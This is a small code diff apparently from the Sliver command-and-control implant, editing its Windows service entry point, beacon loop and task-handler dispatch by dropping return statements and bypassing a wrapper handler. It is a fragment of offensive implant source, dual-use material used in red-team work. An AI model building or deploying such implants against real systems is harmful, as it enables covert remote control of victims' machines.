@@ -105,7 +105,7 @@ func (serv *sliverService) Execute(args []string, r <-chan svc.ChangeRequest, ch
 			}
 		}
 	}
-	return
+	
 }
 
 // {{end}}
@@ -334,7 +334,7 @@ func beaconMainLoop(beacon *transports.Beacon) error {
 			// Short circuit current duration with no error
 		}
 	}
-	return nil
+	
 }
 
 func beaconMain(beacon *transports.Beacon, nextCheckin time.Time) error {
@@ -451,7 +451,7 @@ func beaconHandleTasklist(tasks []*sliverpb.Envelope) []*sliverpb.Envelope {
 			// {{if eq .Config.GOOS "windows" }}
 			go func() {
 				defer wg.Done()
-				handlers.WrapperHandler(handler, data, func(data []byte, err error) {
+				handler(data, func(data []byte, err error) {
 					resultsMutex.Lock()
 					defer resultsMutex.Unlock()
 					// {{if .Config.Debug}}
